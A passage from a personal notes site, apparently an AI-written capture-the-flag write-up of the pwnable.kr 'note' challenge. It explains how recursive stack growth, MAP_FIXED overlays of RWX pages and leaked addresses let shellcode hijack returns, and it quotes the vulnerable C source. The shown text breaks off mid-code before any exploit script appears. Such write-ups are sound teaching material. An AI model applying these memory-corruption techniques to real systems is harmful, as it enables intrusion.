@@ -1,0 +1,1260 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Welcome to Allen Hong's Notes. This site records some of my notes. Hope it can help you a bit. You're also welcome to discuss with me and help point out some of this site's issues.">
+      
+      
+        <meta name="author" content="Allen Hong">
+      
+      
+        <link rel="canonical" href="https://masterallen.github.io/%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/pwnable_kr/note/35.note/">
+      
+      
+        <link rel="prev" href="../34.echo2/">
+      
+      
+        <link rel="next" href="../36.alloca/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.40">
+    
+    
+      
+        <title>Pwnable.kr Note - Allen Hong's Notes</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-WSXPFTNRTD"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-WSXPFTNRTD",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-WSXPFTNRTD",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pwnablekr-note" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="Allen Hong&#x27;s Notes" class="md-header__button md-logo" aria-label="Allen Hong's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Allen Hong's Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pwnable.kr Note
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+        <a href="https://github.com/masterAllen" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    My Github Link
+  </div>
+</a>
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    
+    <div class="custom-sidebar-shell custom-page-shell md-grid">
+        
+          
+            
+            <div class="md-sidebar md-sidebar--primary" data-md-type="navigation" >
+              <div class="md-sidebar__scrollwrap">
+                <div class="md-sidebar__inner">
+                  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+  <a href="../../../../..">加载栏目目录…</a>
+</div>
+<script src="../../../../../javascripts/shared-navigation.js"></script>
+
+<script src="../../../../../javascripts/sidebar-title-tooltip.js"></script>
+<script src="../../../../../javascripts/sidebar-scroll-position.js"></script>
+                </div>
+              </div>
+            </div>
+          
+        
+    </div>
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    <div class="md-container" data-md-component="container"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-site-root="../../../../../"
+         data-navigation-hidden="false">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Main/" class="md-tabs__link">
+          
+  
+  Main
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  系统性知识
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E4%B9%A6%E7%B1%8D%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  书籍记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  算法记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../CheatSheet/" class="md-tabs__link">
+          
+  
+  CheatSheet
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Language/" class="md-tabs__link">
+          
+  
+  Language
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Vision/CMOS%E7%9A%84%E7%90%86%E8%A7%A3/01.CMOS%E5%92%8CCCD%E7%A9%B6%E7%AB%9F%E5%8C%BA%E5%88%AB%E5%9C%A8%E5%93%AA%E9%87%8C/" class="md-tabs__link">
+          
+  
+  Vision
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../IP%E5%9C%B0%E7%90%86%E5%AE%9A%E4%BD%8D/%E6%95%B4%E4%BD%93%E7%9B%AE%E5%BD%95%E6%A0%91/" class="md-tabs__link">
+          
+  
+  IP 地理定位
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../About/" class="md-tabs__link">
+          
+  
+  About
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E5%BD%92%E6%A1%A3/%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/" class="md-tabs__link">
+          
+  
+  归档
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <div class="custom-page-shell md-grid">
+        <div class="custom-main-area">
+          <main class="md-main" data-md-component="main">
+            <div class="md-main__inner md-grid">
+              
+                
+                  
+                  <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                    <div class="md-sidebar__scrollwrap">
+                      
+                        
+                        
+                        
+                          
+                        
+                        
+                          <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                          <div class="md-sidebar-button__wrapper">
+                            <label class="md-sidebar-button" for="__toc"></label>
+                          </div>
+                        
+                      
+                      <div class="md-sidebar__inner">
+                        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        个人前言
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        前言
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        程序功能
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#secret-menu-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        误导点：Secret Menu 的 1 字节溢出
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        关键点一：递归菜单导致栈持续下降
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#map_fixed" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        关键点二：<code>MAP_FIXED</code> 可以覆盖已有映射
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        利用目标
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        利用流程
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="利用流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        1. 不断创建 note，等待命中栈区间
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-shellcode-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2. 创建 shellcode note
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3. 覆盖栈 note
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        为什么能够成功
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        总结
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                      </div>
+                    </div>
+                  </div>
+                
+              
+              
+                <div class="md-content" data-md-component="content">
+                  
+                    
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    欢迎
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    系统性知识
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    信息安全
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    pwnable_kr
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    note
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+                  
+                  <article class="md-content__inner md-typeset">
+                    
+                      
+                        
+  
+  
+
+
+<h1 id="pwnablekr-note">Pwnable.kr Note</h1>
+<div class="file-actions" data-image-edit-revision="f3f39d50fdec694c7145b54df83afaead5f8ef205f5d50730f2022d54ee2555b" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C35.note.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\35.note.md">复制路径</span></div>
+
+<h2 id="_1">个人前言</h2>
+<p>大概在五年之前的组会上做出来的一道题目，无意间点到这篇文章，发现写的很不好，完全看不懂了。于是就直接把源码、自己的脚本、当时写的笔记甩给 GPT5.5，让他来重新总结。</p>
+<p>不得不说，真是吊打我啊，写的比我的好多了，看了一会就立马懂了。</p>
+<p>除了这个章节剩下的全是 AI 写的，我完全不需要修改，期间只问了他一个疑问，然后让他多做了一次调整。</p>
+<p>当时写的笔记的开头，怀念，居然五年多了：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span>竟然在开组会的时候不小心写出来了，感谢无私分享解法的一位外国小哥。
+</span></code></pre></div>
+<h2 id="_2">前言</h2>
+<p>这题的关键不在于单个传统栈溢出，而在于几个看似“不够致命”的点组合在一起：</p>
+<ul>
+<li>程序关闭 ASLR，栈地址相对固定。</li>
+<li><code>select_menu()</code> 反复递归调用自身，导致栈持续向低地址增长。</li>
+<li><code>mmap_s()</code> 使用 <code>MAP_FIXED</code> 强行映射随机地址，可能覆盖已有映射。</li>
+<li>note 页是 <code>RWX</code>，并且创建后会把映射地址打印出来。</li>
+</ul>
+<p>最终思路是：先让递归不断压栈，再等待一次 <code>mmap_s()</code> 正好把 note 映射到当前栈区间内。由于 <code>MAP_FIXED</code> 会覆盖原有栈页，我们就可以把某段栈内容改成 shellcode 地址。之后程序退出或返回时，递归调用开始一层层 <code>leave; ret</code>，最终控制流会跳到 shellcode。</p>
+<h2 id="_3">程序功能</h2>
+<p>程序维护了一个全局指针数组：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">mem_arr</span><span class="p">[</span><span class="mi">257</span><span class="p">];</span>
+</span></code></pre></div>
+<p>用户可以创建、写入、读取、删除 note。创建 note 时，程序调用 <code>mmap_s()</code> 映射一页内存，并把地址打印出来：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">create_note</span><span class="p">(){</span>
+</span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+</span><span id="__span-2-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span>
+</span><span id="__span-2-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span><span id="__span-2-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">mem_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">){</span>
+</span><span id="__span-2-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">            </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mmap_s</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_SIZE</span><span class="p">,</span>
+</span><span id="__span-2-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">                         </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span>
+</span><span id="__span-2-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">                         </span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-2-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">            </span><span class="n">mem_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span>
+</span><span id="__span-2-10"><span class="linenos" data-linenos="10 "></span><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;note created. no %d</span><span class="se">\n</span><span class="s"> [%08x]&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
+</span><span id="__span-2-11"><span class="linenos" data-linenos="11 "></span><span class="w">            </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-2-12"><span class="linenos" data-linenos="12 "></span><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-2-13"><span class="linenos" data-linenos="13 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;memory sults are fool</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-2-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-2-16"><span class="linenos" data-linenos="16 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>这里有两个很重要的利用条件：</p>
+<ol>
+<li>创建出来的 note 页具有 <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> 权限，可以直接放 shellcode。</li>
+<li>程序会泄露每个 note 的实际映射地址，方便脚本判断这次映射是否命中了目标区域。</li>
+</ol>
+<p>写 note 时使用的是 <code>gets()</code>：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">write_note</span><span class="p">(){</span>
+</span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">no</span><span class="p">;</span>
+</span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;note no?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-3-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">no</span><span class="p">);</span>
+</span><span id="__span-3-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="n">clear_newlines</span><span class="p">();</span>
+</span><span id="__span-3-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">no</span><span class="o">&gt;</span><span class="mi">256</span><span class="p">){</span>
+</span><span id="__span-3-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;index out of range</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-3-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">        </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-3-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-10"><span class="linenos" data-linenos="10 "></span><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">mem_arr</span><span class="p">[</span><span class="n">no</span><span class="p">]</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
+</span><span id="__span-3-11"><span class="linenos" data-linenos="11 "></span><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;empty slut!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-3-12"><span class="linenos" data-linenos="12 "></span><span class="w">        </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-3-13"><span class="linenos" data-linenos="13 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;paste your note (MAX : 4096 byte)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-3-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">mem_arr</span><span class="p">[</span><span class="n">no</span><span class="p">]);</span>
+</span><span id="__span-3-16"><span class="linenos" data-linenos="16 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>因为每个 note 页大小是 <code>0x1000</code>，脚本写入的数据不超过这一页即可。真正决定能否利用的不是这里的 <code>gets()</code> 溢出，而是我们能否让某个 note 页映射到栈上。</p>
+<h2 id="secret-menu-1">误导点：Secret Menu 的 1 字节溢出</h2>
+<p>菜单里有一个隐藏选项：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">select_menu</span><span class="p">(){</span>
+</span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">menu</span><span class="p">;</span>
+</span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">command</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span id="__span-4-4"><span class="linenos" data-linenos=" 4 "></span>
+</span><span id="__span-4-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>
+</span><span id="__span-4-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="n">clear_newlines</span><span class="p">();</span>
+</span><span id="__span-4-7"><span class="linenos" data-linenos=" 7 "></span>
+</span><span id="__span-4-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
+</span><span id="__span-4-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mh">0x31337</span><span class="p">:</span>
+</span><span id="__span-4-10"><span class="linenos" data-linenos="10 "></span><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;welcome to hacker&#39;s secret menu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-4-11"><span class="linenos" data-linenos="11 "></span><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;i&#39;m sure 1byte overflow will be enough for you to pwn this</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-4-12"><span class="linenos" data-linenos="12 "></span><span class="w">            </span><span class="n">fgets</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="mi">1025</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-4-13"><span class="linenos" data-linenos="13 "></span><span class="w">            </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-4-14"><span class="linenos" data-linenos="14 "></span><span class="w">        </span><span class="c1">// ...</span>
